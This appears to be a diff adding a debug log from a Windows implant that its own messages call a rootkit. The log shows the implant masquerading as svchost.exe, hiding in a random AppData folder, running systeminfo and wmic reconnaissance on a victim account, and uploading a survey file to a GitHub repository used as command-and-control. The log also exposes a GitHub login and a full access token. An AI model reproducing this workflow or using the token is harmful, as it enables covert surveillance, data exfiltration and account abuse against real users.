@@ -1,0 +1,35 @@
+Mon Jul 26 18:08:59 2021. Initialisation of the log file.
+
+DEBUG: Mon Jul 26 18:08:59 2021: GithubLogin: hidemepls785
+DEBUG: Mon Jul 26 18:08:59 2021: GithubRepoName: furry-octo-parakeet
+DEBUG: Mon Jul 26 18:08:59 2021: GihubAccessToken: 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
+DEBUG: Mon Jul 26 18:08:59 2021: Rootkit Name: Preprod03
+DEBUG: Mon Jul 26 18:08:59 2021: Adding the actual location of the servant: C:\Windows\SysWOW64\svchost.exe
+DEBUG: Mon Jul 26 18:08:59 2021: The folder list for random folder is not empty. Its size is: 1731
+DEBUG: Mon Jul 26 18:08:59 2021: The random path choosed for this execution is: C:\Users\secrétariat\AppData\Local\Packages\Microsoft.MicrosoftOfficeHub_8wekyb3d8bbwe\AC
+ERROR: Mon Jul 26 18:09:00 2021: Heart attack, the rootkit has major bug trying the parse the json from github api in the method fileExistsGithubRepo.
+ERROR: Mon Jul 26 18:09:00 2021: Unknown exception
+DEBUG: Mon Jul 26 18:09:00 2021: The survey file for this target could not be found. Trying to create it and upload it to the github repo.
+DEBUG: Mon Jul 26 18:09:00 2021: This command will be executed to know systeminfo: systeminfo > C:\Users\secqétariat\AppData\Local\Packages\Microsoft.MicrosoftOfficeHub_8wekyb3d8bbwe\AC\systeminfo.txt
+DEBUG: Mon Jul 26 18:09:06 2021: The file systeminfo.txt exists, trying to read and add its content the surveyfile.
+DEBUG: Mon Jul 26 18:09:06 2021: Start of the method readFileWindowsApi for the file: C:\Users\secrétariat\AppData\Local\Packages\Microsoft.MicrosoftOfficeHub_8wekyb3d8bbwe\AC\systeminfo.txt
+DEBUG: Mon Jul 26 18:09:06 2021: The file will be read as binary file.
+DEBUG: Mon Jul 26 18:09:06 2021: The file that will be read weight: 4576
+DEBUG: Mon Jul 26 18:09:06 2021: Success to read the binary file. This number of bytes have been read: 4577
+DEBUG: Mon Jul 26 18:09:06 2021: This command will be executed to know the last reboot time: wmic os get lastBootUpTime > C:\Users\secqétariat\AppData\Local\Packages\Microsoft.MicrosoftOfficeHub_8wekyb3d8bbwe\AC\systeminfo2.txt
+DEBUG: Mon Jul 26 18:09:11 2021: The file systeminfo.txt exists, trying to read and add its content the surveyfile.
+DEBUG: Mon Jul 26 18:09:11 2021: Start of the method readFileWindowsApi for the file: C:\Users\secqétariat\AppData\Local\Packages\Microsoft.MicrosoftOfficeHub_8wekyb3d8bbwe\AC\systeminfo2.txt
+DEBUG: Mon Jul 26 18:09:11 2021: The file will be read as binary file.
+DEBUG: Mon Jul 26 18:09:11 2021: The file that will be read weight: 134
+DEBUG: Mon Jul 26 18:09:11 2021: Success to read the binary file. This number of bytes have been read: 135
+DEBUG: Mon Jul 26 18:09:11 2021: Start of the method writeFileWindowsApi.
+DEBUG: Mon Jul 26 18:09:11 2021: The content size that will be written: 4958
+DEBUG: Mon Jul 26 18:09:11 2021: Success to write the content(number of bytes : 4958) in the file : C:\Users\secqétariat\AppData\Local\Packages\Microsoft.MicrosoftOfficeHub_8wekyb3d8bbwe\AC\secqétariat-survey.txt
+DEBUG: Mon Jul 26 18:09:11 2021: Start of the method uploadFileToGithubRepo.
+DEBUG: Mon Jul 26 18:09:11 2021: Start of the method readFileWindowsApi for the file: C:\Users\secqétariat\AppData\Local\Packages\Microsoft.MicrosoftOfficeHub_8wekyb3d8bbwe\AC\secqétariat-survey.txt
+DEBUG: Mon Jul 26 18:09:11 2021: The file will be read as binary file.
+DEBUG: Mon Jul 26 18:09:11 2021: The file that will be read weight: 4958
+DEBUG: Mon Jul 26 18:09:11 2021: Success to read the binary file. This number of bytes have been read: 4959
+ERROR: Mon Jul 26 18:09:11 2021: Heart attack, the servant has major bug during the servantMissionOutsideContact.
+ERROR: Mon Jul 26 18:09:11 2021: Unknown exception
+DEBUG: Mon Jul 26 18:09:11 2021: Start of GithubCommunication::sendLogs
